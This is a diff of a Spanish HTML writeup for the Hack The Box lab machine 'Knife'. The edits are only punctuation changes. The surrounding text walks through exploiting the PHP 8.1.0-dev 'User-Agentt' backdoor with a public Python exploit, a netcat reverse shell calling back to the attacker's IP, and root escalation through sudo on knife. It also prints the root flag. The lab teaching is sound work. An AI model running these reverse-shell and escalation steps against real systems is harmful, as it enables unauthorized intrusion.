@@ -209,7 +209,7 @@
 </header>
 
 <div class="intro">
-  <b>Requisitos:</b> los mismos de <a href="cap.html">Cap</a> — cuenta HTB (VIP para retiradas), Kali funcionando, y la VPN levantada. Si es tu primer writeup, empieza por la guía de Cap: aquí no repito el flujo básico, lo doy por hecho.
+  <b>Requisitos:</b> los mismos de <a href="cap.html">Cap</a>: cuenta HTB (VIP para retiradas), Kali funcionando, y la VPN levantada. Si es tu primer writeup, empieza por la guía de Cap: aquí no repito el flujo básico, lo doy por hecho.
   <br><br>
   <b>Lección de esta máquina, ya en la conexión:</b> una VPN a la vez. Si levantas una segunda sin cerrar la primera, Linux crea <span class="mono">tun1</span> (porque <span class="mono">tun0</span> sigue ocupada) y verás errores <span class="mono">route ... File exists</span>. Antes de conectar otra VPN, mata la anterior con <span class="mono">sudo pkill openvpn</span> y reconecta: así vuelves a un <span class="mono">tun0</span> limpio.
 </div>
@@ -237,8 +237,8 @@
     <div class="sec-focus">Cuando la web no da nada a la vista, mira lo que hay por debajo.</div>
 
     <h3 class="step">La web no muestra nada obvio</h3>
-    <p class="f">Abres <code class="ic">http://10.129.62.139</code> en Firefox y ves una página de empresa médica ficticia (<em>EMA — Emergent Medical Idea</em>): puro texto, los enlaces de arriba no hacen nada, sin funciones visibles. A simple vista no hay qué explotar.</p>
-    <div class="why"><b>EL GIRO RESPECTO A CAP</b>En Cap la web te mostraba todo a la vista. Aquí no. Cuando una web no da nada obvio, el pentester no se rinde: mira <b>cómo está construido el servidor</b> — qué tecnología y qué versiones corre. Esa info no se ve en la página, pero el servidor la anuncia en las cabeceras HTTP.</div>
+    <p class="f">Abres <code class="ic">http://10.129.62.139</code> en Firefox y ves una página de empresa médica ficticia (<em>EMA: Emergent Medical Idea</em>): puro texto, los enlaces de arriba no hacen nada, sin funciones visibles. A simple vista no hay qué explotar.</p>
+    <div class="why"><b>EL GIRO RESPECTO A CAP</b>En Cap la web te mostraba todo a la vista. Aquí no. Cuando una web no da nada obvio, el pentester no se rinde: mira <b>cómo está construido el servidor</b>: qué tecnología y qué versiones corre. Esa info no se ve en la página, pero el servidor la anuncia en las cabeceras HTTP.</div>
 
     <h3 class="step">Inspeccionar las cabeceras HTTP</h3>
     <p class="f">Cada respuesta web trae "cabeceras": metadatos invisibles que a veces revelan el software y sus versiones. Es como leer la etiqueta de fabricación. Desde la terminal, sin navegador:</p>
@@ -263,11 +263,11 @@ Content-Type: text/html; charset=UTF-8</pre>
     <div class="fcard amber">
       <h4>▚ El backdoor de PHP 8.1.0-dev</h4>
       <p>Buscando <code class="ic">PHP 8.1.0-dev exploit</code> (en Google o en <a href="https://www.exploit-db.com/" target="_blank" rel="noopener">Exploit-DB</a>) se descubre que en <b>2021</b> el repositorio de código de PHP fue comprometido: unos atacantes inyectaron un <b>backdoor</b> en el código fuente, que quedó en esa versión de desarrollo.</p>
-      <p>El backdoor (apodado <b>zerodiumvar_dump</b>) se dispara cuando el servidor recibe una <b>cabecera HTTP con un nombre concreto</b>, y ejecuta como comando lo que venga en ella. Ese nombre es <b><code class="ic">User-Agentt</code></b> — con <b>doble T</b>, no es una errata. Se disfrazó a propósito para parecerse a la cabecera legítima <code class="ic">User-Agent</code> y pasar desapercibida.</p>
+      <p>El backdoor (apodado <b>zerodiumvar_dump</b>) se dispara cuando el servidor recibe una <b>cabecera HTTP con un nombre concreto</b>, y ejecuta como comando lo que venga en ella. Ese nombre es <b><code class="ic">User-Agentt</code></b>, con <b>doble T</b>, no es una errata. Se disfrazó a propósito para parecerse a la cabecera legítima <code class="ic">User-Agent</code> y pasar desapercibida.</p>
     </div>
 
     <h3 class="step">Conseguir y leer el exploit</h3>
-    <p class="f">Las referencias apuntan a un exploit ya escrito en Python (repo de <em>flast101</em>). Se clona y — regla de oro — <b>se lee antes de ejecutar</b>: nunca dispares un exploit a ciegas.</p>
+    <p class="f">Las referencias apuntan a un exploit ya escrito en Python (repo de <em>flast101</em>). Se clona y, regla de oro, <b>se lee antes de ejecutar</b>: nunca dispares un exploit a ciegas.</p>
     <pre><span class="k">git</span> clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git
 <span class="k">cd</span> php-8.1.0-dev-backdoor-rce
 <span class="k">cat</span> revshell_php_8.1.0-dev.py</pre>
@@ -285,16 +285,16 @@ Content-Type: text/html; charset=UTF-8</pre>
     <div class="fcard green">
       <h4>▚ ¿Qué es una reverse shell?</h4>
       <p>Una técnica para conseguir una terminal de la víctima <b>cuando no tienes credenciales</b>. Al revés de lo intuitivo: en vez de que <em>tú te conectes</em> a la víctima (como el SSH de Cap), haces que <b>la víctima se conecte a ti</b>.</p>
-      <p>Tú te pones "a la escucha" en tu Kali; luego, vía el backdoor, ordenas a la víctima que te <b>llame de vuelta</b> y te entregue una shell. Lo que necesita saber de ti no son credenciales, sino <b>tu IP y un puerto</b> — como un número de teléfono, no una contraseña.</p>
+      <p>Tú te pones "a la escucha" en tu Kali; luego, vía el backdoor, ordenas a la víctima que te <b>llame de vuelta</b> y te entregue una shell. Lo que necesita saber de ti no son credenciales, sino <b>tu IP y un puerto</b>, como un número de teléfono, no una contraseña.</p>
     </div>
 
     <h3 class="step">1 · Ponte a la escucha (listener)</h3>
-    <p class="f">En una terminal, espera la conexión entrante con netcat. Queda "colgada" escuchando — es correcto, no la cierres.</p>
+    <p class="f">En una terminal, espera la conexión entrante con netcat. Queda "colgada" escuchando, es correcto, no la cierres.</p>
     <pre><span class="k">nc</span> -lvnp 4444</pre>
     <p class="f"><code class="ic">-l</code> listen · <code class="ic">-v</code> verbose · <code class="ic">-n</code> sin DNS · <code class="ic">-p 4444</code> puerto (el mismo que le pasarás al exploit).</p>
 
     <h3 class="step">2 · Dispara el exploit</h3>
-    <p class="f">Confirma tu IP de <code class="ic">tun0</code> (<code class="ic">ip a show tun0</code>) — error clásico: pasar la IP de eth0 en vez de la de la VPN, y la shell nunca llega. Orden: <b>URL víctima → tu IP → tu puerto</b>.</p>
+    <p class="f">Confirma tu IP de <code class="ic">tun0</code> (<code class="ic">ip a show tun0</code>), un error clásico: pasar la IP de eth0 en vez de la de la VPN, y la shell nunca llega. Orden: <b>URL víctima → tu IP → tu puerto</b>.</p>
     <pre><span class="k">python3</span> revshell_php_8.1.0-dev.py http://10.129.62.139 10.10.14.57 4444</pre>
     <p class="f">La magia ocurre en la terminal del <b>netcat</b>: cae la conexión y aparece un prompt nuevo.</p>
     <pre>connect to [10.10.14.57] from (UNKNOWN) [10.129.62.139] 45772
@@ -327,7 +327,7 @@ james@knife:/$</pre>
     <pre><span class="k">sudo</span> -l</pre>
     <pre>User james may run the following commands on knife:
     (root) NOPASSWD: <span class="o">/usr/bin/knife</span></pre>
-    <p class="f">Lectura: <code class="ic">(root)</code> lo corres como root · <code class="ic">NOPASSWD</code> sin contraseña (por eso <code class="ic">sudo -l</code> funcionó sin la clave de james) · <code class="ic">/usr/bin/knife</code> el binario. Ese es el boleto — y la razón del nombre de la máquina.</p>
+    <p class="f">Lectura: <code class="ic">(root)</code> lo corres como root · <code class="ic">NOPASSWD</code> sin contraseña (por eso <code class="ic">sudo -l</code> funcionó sin la clave de james) · <code class="ic">/usr/bin/knife</code> el binario. Ese es el boleto, y la razón del nombre de la máquina.</p>
 
     <h3 class="step">Qué es knife, y GTFOBins</h3>
     <p class="f"><code class="ic">knife</code> es la CLI de <b>Chef</b>, una plataforma de gestión de configuración. Lo relevante: <b>knife puede ejecutar código Ruby</b>. El mismo patrón letal de Cap: un binario que corre como root y ejecuta código que tú le das.</p>
@@ -342,7 +342,7 @@ james@knife:/$</pre>
 
     <h3 class="step">Root flag</h3>
     <pre><span class="k">cat</span> /root/root.txt   <span class="cmt"># -&gt; 67d2dd2560757b41cd5019a89a441df5</span></pre>
-    <p class="f"><b>Máquina comprometida por completo.</b> 🏴‍☠️</p>
+    <p class="f"><b>Máquina comprometida por completo.</b></p>
   </div>
 </section>
 
@@ -377,7 +377,7 @@ james@knife:/$</pre>
       <li><b>Reverse shell:</b> acceso <em>sin credenciales</em>. Listener (<code class="ic">nc -lvnp</code>) + la víctima te llama de vuelta a tu <b>IP + puerto</b>.</li>
       <li><b>Estabilizar la shell:</b> <code class="ic">python3 -c 'import pty; pty.spawn("/bin/bash")'</code> convierte una shell básica en una usable.</li>
       <li><b>Escalada por <code class="ic">sudo -l</code>:</b> el vector de privesc más común del mundo real. <code class="ic">NOPASSWD</code> es regalo.</li>
-      <li><b>Encadenar GTFOBins:</b> knife hereda de ruby — seguir esa pista hasta el comando final, usando la sección del permiso correcto (Sudo).</li>
+      <li><b>Encadenar GTFOBins:</b> knife hereda de ruby: seguir esa pista hasta el comando final, usando la sección del permiso correcto (Sudo).</li>
     </ul>
   </div>
 </section>
